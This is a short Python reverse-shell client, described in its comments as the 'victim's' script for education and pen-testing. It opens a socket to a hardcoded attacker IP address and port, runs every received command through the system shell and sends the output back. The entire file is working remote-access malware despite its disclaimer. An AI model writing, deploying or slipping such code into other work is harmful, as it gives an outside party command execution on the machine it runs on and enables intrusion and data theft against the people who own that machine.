#================Python version 3.7.3================
# This tool is intented for education use and
# Pen-testing only! Misuse will have legal 
# Consequences! You have been warned!
#==========This is the "victim's" script===========
import socket
import os
import sys
import subprocess


# These are the defaults, change as required
HOST = '134.102.107.29' # Change to Attacker's IP-Address
PORT = 5050 # Change to Attacker's Port


# This function takes care of getting commands and 
# executing them, then sending the attacker the output
# @param s - the socket used, passed from connect_to_host
def running(s):
    while True:
        try:
            # Receive first 4kb of data(command) from host
            received_data = s.recv(4096)
            # Decode it to string
            received_message = received_data.decode()
            # If the command is a change directory command
            # we need to issue it differently
            # lower() turns all capital letters to small
            if "cd" in received_message.lower():
                try:
                    # Change directory to everything at the 3rd spot and onward
                    os.chdir(received_message[3:])
                    # We need to send a response so the socket doesn't get stuck
                    # on waiting for a response
                    # 'b' means we are sending the string as bytes
                    s.send(b"#>")
                except:
                    s.send(b"cd requires at least another argument!")
            else:
                try:
                    # Read subprocess output
                    response = subprocess.check_output(received_message,stderr = subprocess.STDOUT, shell=True)
                    # Send the response (if it is not empty) back to the host
                    if len(response):
                        s.send(response)
                    # Else send a simple #>
                    else:
                        s.send(b"#>")
                except:
                    s.send(b"Must've been an incorrect command!")
        except:
            sys.exit(0)


# This function starts a connection to the attacker
def connect_to_host():
    # Grab global variables HOST and PORT
    global HOST
    global PORT
    # Create new socket object, again, typeless (TCP/UDP)
    s = socket.socket()
    # Connect to attacker. connect function gets a tuple 
    # object (Address,Port) passed
    s.connect((HOST,PORT))
    # Start the running function
    running(s)


# Main function
if __name__ == "__main__":
    connect_to_host()
